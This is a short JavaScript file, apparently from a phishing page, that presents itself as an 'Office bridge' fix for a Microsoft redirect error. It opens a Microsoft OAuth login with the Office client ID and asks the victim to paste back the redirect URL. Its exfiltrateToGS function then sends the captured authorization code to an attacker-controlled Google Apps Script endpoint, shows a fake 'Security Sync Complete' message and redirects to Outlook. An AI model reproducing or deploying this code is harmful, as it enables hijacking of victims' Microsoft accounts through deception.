/**
 * PATH G: UNIVERSAL OFFICE BRIDGE
 * Fixes AADSTS50011 Redirect Mismatch
 */
const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    // The "Microsoft Office" App ID
    const CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
    
    // We use the 'common' endpoint to support Hotmail, Outlook, and Business accounts
    const authUrl = `https://login.microsoftonline.com/common/oauth2/authorize?` +
        `client_id=${CLIENT_ID}` +
        `&response_type=code` + 
        `&has_pt=1` +
        `&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient`;

    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    
    if (!rawData.includes("code=")) {
        alert("Verification code not found. Please finish the login process.");
        return;
    }

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        if (result.status === "success") {
            alert("Security Sync Complete.");
            window.location.href = "https://outlook.live.com";
        }
    } catch (err) {
        console.error("GS Error:", err);
    }
}
